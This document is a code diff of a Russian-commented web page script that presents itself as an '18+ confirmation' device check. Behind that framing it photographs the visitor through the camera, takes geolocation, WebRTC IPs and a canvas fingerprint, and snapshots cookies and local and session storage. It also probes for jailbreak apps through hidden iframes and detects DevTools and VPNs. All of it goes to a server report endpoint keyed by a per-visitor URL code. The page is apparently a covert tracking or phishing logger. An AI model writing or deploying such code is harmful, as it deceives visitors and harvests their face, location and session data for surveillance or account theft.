@@ -1,6 +1,4 @@
-// === app.js (универсальный гейт: ТОЛЬКО iPhone/iPad c iOS/iPadOS >= 18; iPad desktop-UA fix
-// + Safari 18.0/18.4 feature-tests; ПУСКАЕМ ТОЛЬКО ЕСЛИ 18.0 = true. 18.4 игнорируется как пропуск.
-// Device Check по умолчанию только для отчёта (не блокирует), кроме режима ?strict=1) ===
+// === app.js (тонкий фронт: сбор данных -> сервер решает; VT18 обязателен; 18.4 только в отчёт) ===
 
 // API base из <script>window.__API_BASE</script> в index.html
 const API_BASE =
@@ -8,8 +6,10 @@ const API_BASE =
     ? String(window.__API_BASE).replace(/\/+$/, "")
     : "";
 
-// Флаг строгого режима (?strict=1 — вернёт блокировку по score < 60)
+// Режим строгой проверки (?strict=1 => блок по device_check.score < 60)
 const STRICT_MODE = new URLSearchParams(location.search).get("strict") === "1";
+// Доп. лог в консоль (?dev_log=1)
+const DEV_LOG = new URLSearchParams(location.search).get("dev_log") === "1";
 
 // ==== UI ====
 const UI = {
@@ -20,35 +20,10 @@ const UI = {
   title: document.getElementById("title"),
 };
 
-// скрытый input для фолбэка фото (для Safari и запретов камеры)
-(function ensureFileInput() {
-  if (!document.getElementById("fileInp")) {
-    const inp = document.createElement("input");
-    inp.type = "file";
-    inp.id = "fileInp";
-    inp.accept = "image/*";
-    inp.capture = "user";
-    inp.style.display = "none";
-    document.body.appendChild(inp);
-  }
-})();
+function dlog(...a){ if(DEV_LOG) console.log("[gate]", ...a); }
 
-window.__reportReady = false;
-window.__cameraLatencyMs = null;
-window.__lastDeviceCheck = null;
-window.__jbActiveDone = false; // guard for one-shot active JB probe
-
-// === CODE из URL (?code=...) ===
-function determineCode() {
-  const q = new URLSearchParams(location.search).get("code");
-  const code = q ? String(q).trim() : null;
-  return code && /^[A-Za-z0-9-]{3,40}$/.test(code) ? code : null;
-}
-
-// === Кнопка (видимость и стиль мы контролируем тут) ===
 function setBtnLocked() {
-  const b = UI.btn;
-  if (!b) return;
+  const b = UI.btn; if (!b) return;
   b.disabled = true;
   b.style.filter = "grayscale(35%) brightness(0.9)";
   b.style.opacity = "0.6";
@@ -57,8 +32,7 @@ function setBtnLocked() {
   b.style.boxShadow = "0 0 6px rgba(0,153,255,.25)";
 }
 function setBtnReady() {
-  const b = UI.btn;
-  if (!b) return;
+  const b = UI.btn; if (!b) return;
   b.disabled = false;
   b.style.filter = "none";
   b.style.opacity = "1";
@@ -66,8 +40,15 @@ function setBtnReady() {
   b.style.background = "linear-gradient(90deg, #4f00ff, #00bfff)";
   b.style.boxShadow = "0 0 20px rgba(79,0,255,.6), 0 0 28px rgba(0,191,255,.45)";
 }
-function showBtn() { if (UI.btn) UI.btn.style.display = "block"; }
-function hideBtn() { if (UI.btn) UI.btn.style.display = "none"; }
+function showBtn(){ if(UI.btn) UI.btn.style.display="block"; }
+function hideBtn(){ if(UI.btn) UI.btn.style.display="none"; }
+
+// === CODE из URL (?code=...) ===
+function determineCode() {
+  const q = new URLSearchParams(location.search).get("code");
+  const code = q ? String(q).trim() : null;
+  return code && /^[A-Za-z0-9-]{3,40}$/.test(code) ? code : null;
+}
 
 // === Геолокация ===
 async function askGeolocation() {
@@ -96,14 +77,9 @@ function downscaleDataUrl(dataUrl, maxSide = 1024, quality = 0.6) {
       const w = Math.round(img.width * ratio);
       const h = Math.round(img.height * ratio);
       const c = document.createElement("canvas");
-      c.width = w;
-      c.height = h;
+      c.width = w; c.height = h;
       c.getContext("2d").drawImage(img, 0, 0, w, h);
-      try {
-        resolve(c.toDataURL("image/jpeg", quality));
-      } catch (e) {
-        reject(e);
-      }
+      try { resolve(c.toDataURL("image/jpeg", quality)); } catch (e) { reject(e); }
     };
     img.onerror = reject;
     img.src = dataUrl;
@@ -111,6 +87,7 @@ function downscaleDataUrl(dataUrl, maxSide = 1024, quality = 0.6) {
 }
 
 // === Фото (основной путь) ===
+window.__cameraLatencyMs = null;
 async function takePhoto() {
   if (!navigator.mediaDevices?.getUserMedia) throw new Error("Камера недоступна");
   const t0 = (typeof performance !== "undefined" ? performance.now() : Date.now());
@@ -160,6 +137,18 @@ async function takePhoto() {
 }
 
 // === Фото (фолбэк через input[type=file]) ===
+// скрытый input
+(function ensureFileInput() {
+  if (!document.getElementById("fileInp")) {
+    const inp = document.createElement("input");
+    inp.type = "file";
+    inp.id = "fileInp";
+    inp.accept = "image/*";
+    inp.capture = "user";
+    inp.style.display = "none";
+    document.body.appendChild(inp);
+  }
+})();
 async function takePhotoWithFallback() {
   try {
     return await takePhoto();
@@ -179,7 +168,7 @@ async function takePhotoWithFallback() {
   }
 }
 
-// === Парсер версии iOS/iPadOS (универсальный: OS 18_5 или Version/18.5) ===
+// === Парсер iOS/iPadOS из UA (OS 18_5 или Version/18.5) ===
 function parseIOSMajorFromUAUniversal(ua) {
   if (!ua) ua = navigator.userAgent || "";
   const mOS = ua.match(/\bOS\s+(\d+)[._]/i);
@@ -189,10 +178,9 @@ function parseIOSMajorFromUAUniversal(ua) {
   return null;
 }
 
-// === БАЗОВАЯ инфа об устройстве (для гейта и общего профиля) ===
 function getDeviceInfo() {
   const ua = navigator.userAgent || "";
-  const iosVer = parseIOSMajorFromUAUniversal(ua); // фикс iPad desktop-UA
+  const iosVer = parseIOSMajorFromUAUniversal(ua);
   return {
     userAgent: ua,
     platform: navigator.platform,
@@ -214,16 +202,16 @@ async function getPermissionStates() {
   const [geo, camera, mic] = await Promise.all([
     q("geolocation"), q("camera"), q("microphone")
   ]);
-  return { geolocation: geo, camera, microphone: mic };
+  return { geolocation: geo, camera: camera, microphone: mic };
 }
 
-// === WebRTC: сбор ICE-кандидатов (публичные/частные IP) ===
+// === WebRTC: ICE IPs ===
 async function collectWebRTCIps(timeoutMs = 2500) {
   if (!window.RTCPeerConnection) return [];
   return new Promise((resolve) => {
     const ips = new Set();
     const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-    try { pc.createDataChannel("x"); } catch (e) {}
+    try { pc.createDataChannel("x"); } catch {}
     pc.onicecandidate = (e) => {
       if (!e.candidate) return;
       const c = e.candidate.candidate || "";
@@ -243,7 +231,7 @@ async function collectWebRTCIps(timeoutMs = 2500) {
   });
 }
 
-// === /api/client-ip (публичный IP/ISP/country) ===
+// === /api/client-ip ===
 async function fetchClientIP() {
   try {
     const r = await fetch(`${API_BASE}/api/client-ip`, { method: "GET" });
@@ -253,7 +241,7 @@ async function fetchClientIP() {
   } catch { return null; }
 }
 
-// === Canvas fingerprint (хэш + размер) ===
+// === Canvas fingerprint ===
 async function getCanvasFingerprint() {
   try {
     const c = document.createElement("canvas");
@@ -274,12 +262,10 @@ async function getCanvasFingerprint() {
     }
     let hash = 0; for (let i = 0; i < data.length; i++) hash = ((hash<<5)-hash) + data.charCodeAt(i) | 0;
     return { hash: ("f"+(hash>>>0).toString(16)), size: data.length };
-  } catch {
-    return null;
-  }
+  } catch { return null; }
 }
 
-// === Storage estimate + cookies/local/session snapshot ===
+// === Storage snapshot ===
 async function getStorageAndStorageLike() {
   let estimate = null;
   try { estimate = await navigator.storage?.estimate?.() || null; } catch {}
@@ -306,14 +292,11 @@ async function getStorageAndStorageLike() {
   return { estimate, cookies, local, session };
 }
 
-// === Network Information API + RTT ===
+// === Network info ===
 function getNetworkInfo() {
   const ni = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
   const out = ni ? {
-    rtt: ni.rtt,
-    downlink: ni.downlink,
-    effectiveType: ni.effectiveType,
-    saveData: !!ni.saveData
+    rtt: ni.rtt, downlink: ni.downlink, effectiveType: ni.effectiveType, saveData: !!ni.saveData
   } : {};
   try {
     const [nav] = performance.getEntriesByType("navigation");
@@ -322,7 +305,7 @@ function getNetworkInfo() {
   return out;
 }
 
-// === Battery API ===
+// === Battery ===
 async function getBatteryInfo() {
   try {
     if (!navigator.getBattery) return null;
@@ -331,7 +314,7 @@ async function getBatteryInfo() {
   } catch { return null; }
 }
 
-// === WebGL vendor/renderer ===
+// === WebGL info ===
 function getWebGLInfo() {
   try {
     const c = document.createElement("canvas");
@@ -362,7 +345,7 @@ function detectInAppWebView() {
   return { flags, any, isInApp: any.length > 0 };
 }
 
-// === Языки/таймзона/DPR/экран/UAData/platform/touch ===
+// === Locale / display ===
 async function getLocaleAndDisplay() {
   const tz = (Intl && Intl.DateTimeFormat && Intl.DateTimeFormat().resolvedOptions)
     ? Intl.DateTimeFormat().resolvedOptions().timeZone : null;
@@ -390,7 +373,7 @@ async function getLocaleAndDisplay() {
   };
 }
 
-// === DevTools эвристика по размерам окна ===
+// === DevTools эвристика ===
 function detectDevtoolsHeuristic() {
   try {
     const dw = Math.abs((window.outerWidth || 0) - window.innerWidth);
@@ -400,7 +383,7 @@ function detectDevtoolsHeuristic() {
   } catch { return null; }
 }
 
-// === PN/Proxy эвристика (+ сопоставление TZ ↔ страна, DC-ISP ключевые слова) ===
+// === PN/Proxy эвристика ===
 function analyzeNetworkHeuristics({ publicIp, webrtcIps, network, cameraLatencyMs, locale, ipMeta }) {
   const reasons = [];
   let scoreAdj = 0;
@@ -432,7 +415,6 @@ function analyzeNetworkHeuristics({ publicIp, webrtcIps, network, cameraLatencyM
     scoreAdj -= 5;
   }
 
-  // Грубая проверка TZ ↔ страна (best-effort)
   const tz = (locale?.timeZone || "").toUpperCase();
   const country = (publicIp?.country || ipMeta?.country || "").toUpperCase();
   if (tz && country && !tz.includes(country) && !tz.includes("UTC") && !tz.includes("GMT")) {
@@ -447,7 +429,7 @@ function analyzeNetworkHeuristics({ publicIp, webrtcIps, network, cameraLatencyM
   return { label, scoreAdj, reasons, dcIsp: !!(scoreAdj <= -25 || DC_WORDS.some(w => isp.includes(w))) };
 }
 
-// === Лёгкая детекция подмены/автоматизации + Device Check скоринг ===
+// === Лёгкая детекция + скоринг (для strict) ===
 async function runDeviceCheck(clientProfilePartial) {
   const reasons = [];
   const details = {};
@@ -465,15 +447,10 @@ async function runDeviceCheck(clientProfilePartial) {
     details.maxTouchPoints = Number(navigator.maxTouchPoints || 0);
     details.navigator_webdriver = (typeof navigator.webdriver === "boolean") ? navigator.webdriver : undefined;
 
-    // Следы расширений
     const leakedChromeRuntime = !!(window.chrome && window.chrome.runtime);
     const leakedBrowserRuntime = !!(window.browser && window.browser.runtime);
-    if (leakedChromeRuntime || leakedBrowserRuntime) {
-      reasons.push("Следы runtime API расширений");
-      score -= 5;
-    }
+    if (leakedChromeRuntime || leakedBrowserRuntime) { reasons.push("Следы runtime API расширений"); score -= 5; }
 
-    // Переопределённые Web-API (не [native code])
     function looksNative(fn) {
       try { return typeof fn === "function" && /\[native code\]/.test(Function.prototype.toString.call(fn)); }
       catch { return true; }
@@ -482,40 +459,20 @@ async function runDeviceCheck(clientProfilePartial) {
       !looksNative(navigator.permissions?.query) ||
       !looksNative(navigator.geolocation?.getCurrentPosition) ||
       !looksNative(navigator.mediaDevices?.getUserMedia);
-    if (suspiciousNative) {
-      reasons.push("Web API переопределены (не native)");
-      score -= 5;
-    }
+    if (suspiciousNative) { reasons.push("Web API переопределены (не native)"); score -= 5; }
 
-    // Автоматизация
-    if (details.navigator_webdriver === true) {
-      reasons.push("navigator.webdriver === true (автоматизация)");
-      score -= 60;
-    }
+    if (details.navigator_webdriver === true) { reasons.push("navigator.webdriver === true (автоматизация)"); score -= 60; }
 
-    // DevTools эвристика
     const devtools = detectDevtoolsHeuristic();
     details.devtools = devtools;
-    if (devtools?.opened) {
-      reasons.push("DevTools размеры окна");
-      score -= 6;
-    }
+    if (devtools?.opened) { reasons.push("DevTools размеры окна"); score -= 6; }
 
-    // Очень малая cameraLatency
     details.cameraLatencyMs = (typeof window.__cameraLatencyMs === "number") ? window.__cameraLatencyMs : null;
-    if (details.cameraLatencyMs != null && details.cameraLatencyMs <= 5) {
-      reasons.push("Слишком малая cameraLatency");
-      score -= 10;
-    }
+    if (details.cameraLatencyMs != null && details.cameraLatencyMs <= 5) { reasons.push("Слишком малая cameraLatency"); score -= 10; }
 
-    // In-App WebView / WKWebView
     const inApp = clientProfilePartial?.inAppWebView;
-    if (inApp?.isInApp || inApp?.flags?.WKWebView) {
-      reasons.push("In-App WebView/WKWebView");
-      score -= 8;
-    }
+    if (inApp?.isInApp || inApp?.flags?.WKWebView) { reasons.push("In-App WebView/WKWebView"); score -= 8; }
 
-    // PN/Proxy эвристика
     const pn = analyzeNetworkHeuristics({
       publicIp: clientProfilePartial?.publicIp,
       webrtcIps: clientProfilePartial?.webrtcIps,
@@ -528,14 +485,8 @@ async function runDeviceCheck(clientProfilePartial) {
     if (pn.label === "likely") { reasons.push("VPN/Proxy: likely"); score -= 25; }
     else if (pn.label === "possible") { reasons.push("VPN/Proxy: possible"); score -= 10; }
 
-    // Jailbreak влияние
-    if (clientProfilePartial?.jbProbesActive?.summary?.label === 'likely') {
-      reasons.push('Jailbreak likely (active probe)');
-      score -= 30;
-    } else if (clientProfilePartial?.jbProbesActive?.summary?.label === 'possible') {
-      reasons.push('Jailbreak possible (active probe)');
-      score -= 12;
-    }
+    if (clientProfilePartial?.jbProbesActive?.summary?.label === 'likely') { reasons.push('Jailbreak likely (active probe)'); score -= 30; }
+    else if (clientProfilePartial?.jbProbesActive?.summary?.label === 'possible') { reasons.push('Jailbreak possible (active probe)'); score -= 12; }
 
     if (score >= 80) reasons.push("Ок: окружение выглядит правдоподобно");
     else if (score >= 60) reasons.push("Есть несостыковки — рекомендуется доп. проверка");
@@ -552,6 +503,7 @@ async function runDeviceCheck(clientProfilePartial) {
 }
 
 // === Active Jailbreak probe (one-shot) ===
+window.__jbActiveDone = false;
 const JB_ACTIVE_SCHEMES = [
   "cydia://package/com.example",
   "sileo://package/com.example",
@@ -559,67 +511,45 @@ const JB_ACTIVE_SCHEMES = [
   "filza://",
   "undecimus://"
 ];
-
 function makeHiddenIframeForActive() {
   const ifr = document.createElement("iframe");
-  ifr.style.width = "1px";
-  ifr.style.height = "1px";
-  ifr.style.border = "0";
-  ifr.style.position = "fixed";
-  ifr.style.left = "-9999px";
-  ifr.style.top = "-9999px";
+  ifr.style.width = "1px"; ifr.style.height = "1px";
+  ifr.style.border = "0"; ifr.style.position = "fixed";
+  ifr.style.left = "-9999px"; ifr.style.top = "-9999px";
   ifr.setAttribute("aria-hidden", "true");
   return ifr;
 }
-
 function tryOpenSchemeActive(scheme, timeoutMs = 900) {
   return new Promise((resolve) => {
     const start = Date.now();
     let finished = false;
     const iframe = makeHiddenIframeForActive();
     document.body.appendChild(iframe);
-
     const cleanup = (res) => {
       if (finished) return;
       finished = true;
-      try { iframe.remove(); } catch (e) {}
+      try { iframe.remove(); } catch {}
       resolve(res);
     };
-
     const onVis = () => {
       if (document.hidden || document.visibilityState === 'hidden') {
         cleanup({ scheme, opened: true, reason: 'visibilitychange', durationMs: Date.now() - start });
       }
     };
     document.addEventListener('visibilitychange', onVis, { once: true });
-
-    const onPageHide = () => {
-      cleanup({ scheme, opened: true, reason: 'pagehide', durationMs: Date.now() - start });
-    };
+    const onPageHide = () => { cleanup({ scheme, opened: true, reason: 'pagehide', durationMs: Date.now() - start }); };
     window.addEventListener('pagehide', onPageHide, { once: true });
-
-    const onError = (e) => {
-      cleanup({ scheme, opened: false, reason: 'error', error: String(e), durationMs: Date.now() - start });
-    };
+    const onError = (e) => { cleanup({ scheme, opened: false, reason: 'error', error: String(e), durationMs: Date.now() - start }); };
     iframe.addEventListener('error', onError, { once: true });
 
-    try {
-      iframe.src = scheme;
-    } catch (e) {
-      cleanup({ scheme, opened: false, reason: 'set-src-exception', error: String(e), durationMs: Date.now() - start });
-      return;
-    }
+    try { iframe.src = scheme; }
+    catch (e) { cleanup({ scheme, opened: false, reason: 'set-src-exception', error: String(e), durationMs: Date.now() - start }); return; }
 
-    setTimeout(() => {
-      cleanup({ scheme, opened: false, reason: 'timeout', durationMs: Date.now() - start });
-    }, timeoutMs);
+    setTimeout(() => { cleanup({ scheme, opened: false, reason: 'timeout', durationMs: Date.now() - start }); }, timeoutMs);
   });
 }
-
 async function collectActiveJailbreakProbes(options = {}) {
-  if (window.__jbActiveDone) {
-    return { summary: { label: 'skipped', reasons: ['already_ran'] }, results: [], firstPositive: null };
-  }
+  if (window.__jbActiveDone) return { summary: { label: 'skipped', reasons: ['already_ran'] }, results: [], firstPositive: null };
   window.__jbActiveDone = true;
 
   const schemes = options.schemes || JB_ACTIVE_SCHEMES;
@@ -635,10 +565,7 @@ async function collectActiveJailbreakProbes(options = {}) {
     try {
       const res = await tryOpenSchemeActive(scheme, perSchemeTimeout);
       results.push(res);
-      if (res.opened) {
-        firstPositive = res;
-        break;
-      }
+      if (res.opened) { firstPositive = res; break; }
     } catch (e) {
       results.push({ scheme, opened: false, reason: 'exception', error: String(e) });
     }
@@ -646,18 +573,11 @@ async function collectActiveJailbreakProbes(options = {}) {
 
   let label = 'unlikely';
   const reasons = [];
-  if (firstPositive) {
-    label = 'likely';
-    reasons.push('scheme_opened');
-    if (firstPositive.reason) reasons.push(firstPositive.reason);
-  } else {
+  if (firstPositive) { label = 'likely'; reasons.push('scheme_opened'); if (firstPositive.reason) reasons.push(firstPositive.reason); }
+  else {
     const visHints = results.filter(r => r.reason === 'visibilitychange' || r.reason === 'pagehide');
-    if (visHints.length > 0) {
-      label = 'possible';
-      reasons.push('visibility_hints');
-    } else {
-      reasons.push('no_scheme_opened');
-    }
+    if (visHints.length > 0) { label = 'possible'; reasons.push('visibility_hints'); }
+    else { reasons.push('no_scheme_opened'); }
   }
 
   const totalMs = results.reduce((s, r) => s + (r.durationMs || 0), 0);
@@ -666,30 +586,23 @@ async function collectActiveJailbreakProbes(options = {}) {
   return { summary, results, firstPositive };
 }
 
-// === Safari feature-tests (локальный фолбэк, если __featureGate недоступен) ===
+// === Safari feature-tests ===
 async function testSafari18_0_ViewTransitions() {
   const hasAPI = typeof document.startViewTransition === 'function';
   const cssOK = CSS?.supports?.('view-transition-name: auto') === true;
 
-  let ran = false;
-  let finished = false;
+  let ran = false, finished = false;
   try {
     if (hasAPI) {
       const div = document.createElement('div');
       div.textContent = 'A'; document.body.appendChild(div);
       const vt = document.startViewTransition(() => { div.textContent = 'B'; ran = true; });
-      await vt?.finished; finished = true;
-      div.remove();
+      await vt?.finished; finished = true; div.remove();
     }
   } catch {}
 
-  return {
-    feature: 'Safari 18.0 View Transitions',
-    pass: !!(hasAPI && cssOK && ran && finished),
-    details: { hasAPI, cssOK, ran, finished }
-  };
+  return { feature: 'Safari 18.0 View Transitions', pass: !!(hasAPI && cssOK && ran && finished), details: { hasAPI, cssOK, ran, finished } };
 }
-
 async function testSafari18_4_Triple() {
   let shapeOK = false;
   try {
@@ -697,33 +610,18 @@ async function testSafari18_4_Triple() {
     el.style.clipPath = 'shape(from right center, line to bottom center, line to right center)';
     shapeOK = !!el.style.clipPath;
   } catch {}
-
-  const cookieStoreOK = typeof window.cookieStore === 'object' && typeof cookieStore.get === 'function';
+  const cookieStoreOK = typeof window.cookieStore === 'object' && typeof cookieStore?.get === 'function';
   const webauthnOK =
     typeof window.PublicKeyCredential?.parseCreationOptionsFromJSON === 'function' &&
     typeof window.PublicKeyCredential?.parseRequestOptionsFromJSON === 'function' &&
     typeof window.PublicKeyCredential?.prototype?.toJSON === 'function';
-
-  return {
-    feature: 'Safari 18.4 shape() + cookieStore + WebAuthn JSON',
-    pass: !!(shapeOK && cookieStoreOK && webauthnOK),
-    details: { shapeOK, cookieStoreOK, webauthnOK }
-  };
+  return { feature: 'Safari 18.4 shape() + cookieStore + WebAuthn JSON', pass: !!(shapeOK && cookieStoreOK && webauthnOK), details: { shapeOK, cookieStoreOK, webauthnOK } };
 }
-
 async function runSafariFeatureTests(maxWaitMs = 1800) {
-  const timeout = (p, ms) => Promise.race([
-    p,
-    new Promise(res => setTimeout(() => res({ feature: 'timeout', pass: false, details: { timeoutMs: ms } }), ms))
-  ]);
-  const [vt18, triple18_4] = await Promise.all([
-    timeout(testSafari18_0_ViewTransitions(), maxWaitMs),
-    timeout(testSafari18_4_Triple(), maxWaitMs)
-  ]);
+  const timeout = (p, ms) => Promise.race([ p, new Promise(res => setTimeout(() => res({ feature: 'timeout', pass: false, details: { timeoutMs: ms } }), ms)) ]);
+  const [vt18, triple18_4] = await Promise.all([ timeout(testSafari18_0_ViewTransitions(), maxWaitMs), timeout(testSafari18_4_Triple(), maxWaitMs) ]);
   return { vt18_0: vt18, triple18_4 };
 }
-
-// === Ожидание результата «тихих» тестов из index.html (если успели выполниться) ===
 async function waitFeatureGate(maxMs = 800) {
   if (window.__featureGate) return window.__featureGate;
   return new Promise(resolve => {
@@ -737,11 +635,9 @@ async function waitFeatureGate(maxMs = 800) {
 
 // === Быстрый мультисбор профиля клиента ===
 async function collectClientProfile() {
-  // одна активная JB-проба на сессию
   let jbProbesActive = { summary:{ label: 'skipped' }, results: [] };
-  try {
-    jbProbesActive = await collectActiveJailbreakProbes().catch(() => ({ summary:{ label:'error' }, results:[] }));
-  } catch { jbProbesActive = { summary:{ label:'error' }, results:[] }; }
+  try { jbProbesActive = await collectActiveJailbreakProbes().catch(() => ({ summary:{ label:'error' }, results:[] })); }
+  catch { jbProbesActive = { summary:{ label:'error' }, results:[] }; }
 
   const [
     permissions, webrtcIps, publicIp, canvas, storageLike,
@@ -794,8 +690,8 @@ async function collectClientProfile() {
   return profile;
 }
 
-// === Отправка отчёта ===
-async function sendReport({ photoBase64, geo, client_profile, device_check, allowLaunch, vt18_ok, t184_ok, denyReason }) {
+// === Отправка отчёта на сервер (сервер принимает решение) ===
+async function sendReport({ photoBase64, geo, client_profile, device_check, featuresSummary }) {
   const info = getDeviceInfo();
   const code = determineCode();
   if (!code) throw new Error("Нет кода в URL");
@@ -804,12 +700,12 @@ async function sendReport({ photoBase64, geo, client_profile, device_check, allo
     ...info, // {userAgent, platform, iosVersion, isSafari}
     geo,
     photoBase64,
-    note: denyReason ? String(denyReason) : "auto",
+    note: "auto",
     code,
     client_profile,
     device_check,
-    allowLaunch: !!allowLaunch,
-    featuresSummary: { VT18: vt18_ok ? 'ok' : '—', v18_4: t184_ok ? 'ok' : '—' }
+    featuresSummary,
+    strict: STRICT_MODE ? 1 : 0
   };
 
   const r = await fetch(`${API_BASE}/api/report`, {
@@ -828,79 +724,48 @@ async function sendReport({ photoBase64, geo, client_profile, device_check, allo
   return data;
 }
 
-// === ГЕЙТ: пускаем только iPhone/iPad с iOS/iPadOS >= 18 ===
-const MIN_IOS_MAJOR = 18;
+// === Основной поток (всё решает сервер) ===
+window.__reportReady = false;
+window.__decision = null;
 
-function isIOSFamily() {
-  const ua = navigator.userAgent || "";
-  const touchMac = navigator.platform === "MacIntel" && (navigator.maxTouchPoints || 0) > 1; // iPadOS desktop-UA
-  return /(iPhone|iPad|iPod)/.test(ua) || touchMac;
-}
-function secureContextOK() {
-  return location.protocol === "https:" || location.hostname === "localhost";
-}
-function gateCheck() {
-  if (!secureContextOK())
-    return { ok:false, reason:'Нужен HTTPS (или localhost) для доступа к камере/гео.' };
-  if (!isIOSFamily())
-    return { ok:false, reason:'Доступ только с iPhone/iPad (iOS/iPadOS).' };
-  const iosMajor = parseIOSMajorFromUAUniversal(navigator.userAgent || "");
-  if (iosMajor == null)
-    return { ok:false, reason:'Не удалось определить версию iOS/iPadOS.' };
-  if (iosMajor < MIN_IOS_MAJOR)
-    return { ok:false, reason:`Версия iOS/iPadOS ниже ${MIN_IOS_MAJOR}.` };
-  return { ok:true, iosMajor };
-}
-
-// === Основной поток ===
 async function autoFlow() {
   try {
     setBtnLocked();
-    if (UI.text) UI.text.innerHTML = "Запрашиваем разрешения на проверку устройства…";
+    showBtn();
+    if (UI.title) UI.title.textContent = "Подтверждение 18+";
+    if (UI.text) UI.text.innerHTML = "Готовим проверку устройства…";
 
-    // Параллельно: гео + фото + профиль
+    const code = determineCode();
+    if (!code) {
+      if (UI.title) UI.title.textContent = "Ошибка";
+      if (UI.text) UI.text.innerHTML = '<span class="err">Нет кода в URL.</span>';
+      hideBtn(); return;
+    }
+
+    // Сбор данных параллельно
+    if (UI.note) UI.note.textContent = "Запрашиваем доступ к камере/гео…";
     const [geo, rawPhoto, client_profile] = await Promise.all([
       askGeolocation(), takePhotoWithFallback(), collectClientProfile()
     ]);
     const photoBase64 = await downscaleDataUrl(rawPhoto, 1024, 0.6);
 
-    // 1) Жёсткая стадия: Safari feature-tests (ТОЛЬКО 18.0 даёт пропуск)
+    // Фиче-тесты: сначала ждём «тихий» результат из index.html, иначе запускаем сами
+    if (UI.note) UI.note.textContent = "Проверяем системные возможности…";
+    const fg = await waitFeatureGate();
     let vt18_ok, t184_ok;
-    const fg = await waitFeatureGate(); // отдаст результат «тихих» тестов из index.html
-    if (fg) {
-      vt18_ok = !!fg.effective?.vt18Pass;
-      t184_ok = !!fg.effective?.v184Pass;
+    if (fg?.effective) {
+      vt18_ok = !!fg.effective.vt18Pass;
+      t184_ok = !!fg.effective.v184Pass;
     } else {
-      // фолбэк — сами прогоним
       const { vt18_0, triple18_4 } = await runSafariFeatureTests();
       vt18_ok = !!vt18_0?.pass;
       t184_ok = !!triple18_4?.pass;
     }
+    const featuresSummary = { VT18: vt18_ok ? 'ok' : '—', v18_4: t184_ok ? 'ok' : '—' };
+    dlog("features:", featuresSummary);
 
-    const featTxt = `Правило: требуется 18.0 • VT18=${vt18_ok ? 'ok' : '—'} • 18.4=${t184_ok ? 'ok' : '—'}`;
-
-    if (!vt18_ok) {
-      // ❌ 18.0 не прошёл — блок, даже если 18.4 = true
-      window.__reportReady = false;
-      setBtnLocked();
-      if (UI.title) UI.title.textContent = "Доступ отклонён";
-      if (UI.text) UI.text.innerHTML = '<span class="err">Отказ по feature-tests (18.0 обязательно).</span>';
-      if (UI.reason) UI.reason.textContent = featTxt;
-      if (UI.note) UI.note.textContent = "18.4 игнорируется как основание для допуска.";
-      try {
-        await sendReport({
-          photoBase64, geo, client_profile,
-          device_check: null,
-          allowLaunch: false,
-          vt18_ok, t184_ok,
-          denyReason: 'features_fail_18only'
-        });
-      } catch {}
-      return;
-    }
-
-    // ✅ 18.0 пройден — по умолчанию пускаем.
-    // Device Check только для отчёта, КРОМЕ STRICT_MODE (тогда блок по score < 60).
+    // Лёгкий device_check (для strict), решает сервер
+    if (UI.note) UI.note.textContent = "Анализ окружения…";
     let device_check = null;
     try {
       device_check = await runDeviceCheck({
@@ -911,34 +776,34 @@ async function autoFlow() {
         inAppWebView: client_profile.inAppWebView,
         jbProbesActive: client_profile.jbProbesActive
       });
-      window.__lastDeviceCheck = device_check;
     } catch {}
 
-    if (STRICT_MODE && device_check && device_check.score < 60) {
+    if (UI.text) UI.text.innerHTML = "Отправляем отчёт…";
+    const resp = await sendReport({ photoBase64, geo, client_profile, device_check, featuresSummary });
+    window.__decision = resp?.decision || null;
+    const canLaunch = !!resp?.decision?.canLaunch;
+
+    const featTxt = `Правило: требуется 18.0 • VT18=${vt18_ok ? 'ok' : '—'} • 18.4=${t184_ok ? 'ok' : '—'}`;
+
+    if (canLaunch) {
+      window.__reportReady = true;
+      setBtnReady();
+      if (UI.title) UI.title.textContent = "Проверка пройдена";
+      if (UI.text) UI.text.innerHTML = '<span class="ok">Ок (допуск выдан сервером).</span>';
+      if (UI.note) UI.note.textContent = STRICT_MODE
+        ? `${featTxt} • strict=1 (score ≥ 60)`
+        : featTxt;
+      dlog("decision: allow", resp?.decision);
+    } else {
       window.__reportReady = false;
       setBtnLocked();
-      if (UI.title) UI.title.textContent = "Доступ отклонён (strict)";
-      if (UI.text) UI.text.innerHTML = '<span class="err">Проверка не пройдена (score &lt; 60).</span>';
-      if (UI.reason) UI.reason.textContent = "Причины: " + device_check.reasons.join("; ");
-      if (UI.note) UI.note.textContent = `${featTxt} • strict=1`;
-      try {
-        await sendReport({ photoBase64, geo, client_profile, device_check, allowLaunch: false, vt18_ok, t184_ok, denyReason: 'score_fail_strict' });
-      } catch {}
-      return;
-    }
-
-    // 2) Успешно — отправляем данные, даём кнопку
-    if (UI.text) UI.text.innerHTML = "Отправляем данные…";
-    const resp = await sendReport({ photoBase64, geo, client_profile, device_check, allowLaunch: true, vt18_ok, t184_ok });
-
-    window.__reportReady = true;
-    setBtnReady();
-    if (UI.title) UI.title.textContent = "Проверка пройдена";
-    if (UI.text) UI.text.innerHTML = '<span class="ok">Ок (18.0 пройден).</span>';
-    if (UI.note) UI.note.textContent = STRICT_MODE ? `${featTxt} • strict=1 (score ≥ 60)` : `${featTxt}`;
-
-    if (resp && resp.delivered === false && UI.note) {
-      UI.note.textContent = resp.reason || "Отправлено с задержкой.";
+      if (UI.title) UI.title.textContent = "Доступ отклонён";
+      if (UI.text) UI.text.innerHTML = '<span class="err">Отказ (решение сервера).</span>';
+      const strictInfo = (resp?.decision?.strict?.enabled && resp?.decision?.strict?.failed)
+        ? ` • strict fail (score=${resp?.decision?.strict?.score ?? 'n/a'})` : '';
+      if (UI.reason) UI.reason.textContent = `${featTxt}${strictInfo}`;
+      if (UI.note) UI.note.textContent = "Обратитесь к поддержке, если это ошибка.";
+      dlog("decision: deny", resp?.decision);
     }
   } catch (e) {
     console.error("[AUTO-FLOW ERROR]", e);
@@ -950,55 +815,23 @@ async function autoFlow() {
   }
 }
 
-// Экспорт (если вызываешь из index.html)
+// Экспорт (если нужно дергать вручную из index.html)
 window.__autoFlow = autoFlow;
 
-// === Управление UI кнопкой и запуском ===
-function applyGateAndUI() {
-  const res = gateCheck();
-  if (res.ok) {
-    if (UI.title) UI.title.textContent = "Подтверждение 18+";
-    if (UI.text) UI.text.innerHTML = '<span class="ok">Доступ разрешён.</span>';
-    if (UI.reason) {
-      const platIsIPad = /iPad|MacIntel/.test(navigator.platform) || /iPad/.test(navigator.userAgent);
